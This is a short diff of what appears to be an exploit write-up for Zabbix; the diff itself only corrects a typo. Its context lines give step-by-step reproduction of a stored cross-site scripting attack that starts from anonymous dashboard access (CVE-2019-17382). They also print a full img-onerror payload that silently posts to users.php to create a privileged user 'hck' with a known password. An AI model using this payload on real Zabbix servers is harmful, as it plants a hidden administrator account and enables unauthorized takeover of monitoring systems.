@@ -15,7 +15,7 @@ Payload: <img src="x" onerror="var n='hck',q=jQuery;q.post('users.php',{sid:q('#
 Steps to Reproduce Bug:
 1- Go to /zabbix/zabbix.php?action=dashboard.list (anonymous login CVE-2019-17382)
 2- Create new dashboard
-3- Add a new widget => Type: Map nabigation tree
+3- Add a new widget => Type: Map navigation tree
 4- Past into parameter "Name": <img src="x" onerror="var n='hck',q=jQuery;q.post('users.php',{sid:q('#sid').attr('value'),form:'Create+user',alias:n,name:n,surname:n,'user_groups[]':7,password1:n,password2:n,theme:'default',refresh:'9s',rows_per_page:9,url:'',user_type:3,add:'Add'});">
 5- Click to "Add" button
 
